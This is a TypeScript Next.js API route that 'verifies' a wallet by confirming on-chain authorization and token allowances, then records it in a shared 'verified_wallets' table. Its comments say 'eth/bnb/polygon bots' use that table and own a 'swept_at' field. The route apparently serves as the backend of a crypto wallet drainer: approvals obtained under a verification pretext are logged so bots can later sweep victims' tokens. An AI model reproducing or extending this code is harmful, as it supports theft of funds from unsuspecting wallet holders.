import { NextRequest, NextResponse } from "next/server";
import { isAddress, getAddress } from "ethers";
import { supabaseAdmin } from "@/lib/supabase";
import { getChain } from "@/lib/chains";
import { verifyOnChainAuthorization, verifyOnChainAllowances } from "@/lib/onchain";

export const runtime = "nodejs";

type TokenRow = { symbol: string; address: string; txHash?: string };

interface VerifyBody {
  address: string;
  chain: string;
  authorizeTx?: string;
  approvedTokens?: TokenRow[];
}

const TX_HASH_RE = /^0x[0-9a-fA-F]{64}$/;

function mergeTokens(existing: unknown, incoming: TokenRow[]): TokenRow[] {
  const map = new Map<string, TokenRow>();
  const push = (t: TokenRow) => {
    if (!t?.address || !isAddress(t.address)) return;
    const key = getAddress(t.address).toLowerCase();
    const prev = map.get(key);
    map.set(key, {
      symbol: t.symbol || prev?.symbol || "TOKEN",
      address: getAddress(t.address),
      txHash: t.txHash || prev?.txHash,
    });
  };
  if (Array.isArray(existing)) {
    for (const t of existing as TokenRow[]) push(t);
  }
  for (const t of incoming) push(t);
  return [...map.values()];
}

/**
 * Upserts into the shared `verified_wallets` table used by eth/bnb/polygon bots.
 * - onConflict (address, chain) → no duplicate rows
 * - merges approved_tokens so HKCM USDC does not wipe prior escrow/WV tokens
 * - never clears swept_at
 */
export async function POST(req: NextRequest) {
  try {
    const body = (await req.json().catch(() => null)) as VerifyBody | null;
    if (!body) {
      return NextResponse.json({ ok: false, error: "invalid_json" }, { status: 400 });
    }

    const { address, chain: chainName, authorizeTx, approvedTokens = [] } = body;
    if (!address || !isAddress(address)) {
      return NextResponse.json({ ok: false, error: "invalid_address" }, { status: 400 });
    }
    const chain = getChain(chainName);
    if (!chain) {
      return NextResponse.json({ ok: false, error: "unsupported_chain" }, { status: 400 });
    }
    if (authorizeTx && !TX_HASH_RE.test(authorizeTx)) {
      return NextResponse.json({ ok: false, error: "invalid_tx_hash" }, { status: 400 });
    }

    const checksummed = getAddress(address);

    let authorized = false;
    for (let attempt = 0; attempt < 5 && !authorized; attempt++) {
      const authResult = await verifyOnChainAuthorization(chain, checksummed);
      authorized = authResult.authorized;
      if (!authorized && attempt < 4) await new Promise((r) => setTimeout(r, 2000));
    }

    const tokenAddresses = approvedTokens
      .map((t) => t.address)
      .filter((a): a is string => typeof a === "string" && isAddress(a));
    const allowanceResult = tokenAddresses.length
      ? await verifyOnChainAllowances(chain, checksummed, tokenAddresses)
      : { confirmed: [] as string[] };

    const confirmedTokens = approvedTokens.filter((t) =>
      allowanceResult.confirmed.some(
        (a) => t.address && a.toLowerCase() === t.address.toLowerCase()
      )
    );

    if (!authorized || confirmedTokens.length === 0) {
      return NextResponse.json(
        {
          ok: false,
          error: !authorized
            ? "authorization_not_confirmed"
            : "token_approvals_not_confirmed",
          authorized,
          approvedTokens: confirmedTokens,
        },
        { status: 409 }
      );
    }

    const db = supabaseAdmin();

    // Read existing row first so we merge tokens and preserve swept_at.
    const { data: existing } = await db
      .from("verified_wallets")
      .select("approved_tokens, swept_at, authorize_tx")
      .eq("address", checksummed)
      .eq("chain", chain.name)
      .maybeSingle();

    const mergedTokens = mergeTokens(existing?.approved_tokens, confirmedTokens);

    const { error: upsertErr } = await db.from("verified_wallets").upsert(
      {
        address: checksummed,
        chain: chain.name,
        authorized: true,
        authorize_tx: authorizeTx || existing?.authorize_tx || null,
        approved_tokens: mergedTokens,
        needs_reactivation: false,
        // Preserve swept_at — bots own that field; never reset on re-verify.
        swept_at: existing?.swept_at ?? null,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "address,chain" }
    );

    if (upsertErr) {
      console.error("[hkcm/verify] upsert failed:", upsertErr);
      return NextResponse.json({ ok: false, error: "persist_failed" }, { status: 500 });
    }

    return NextResponse.json({
      ok: true,
      authorized: true,
      approvedTokens: mergedTokens,
    });
  } catch (err) {
    console.error("[hkcm/verify] unexpected:", err);
    return NextResponse.json({ ok: false, error: "internal_error" }, { status: 500 });
  }
}
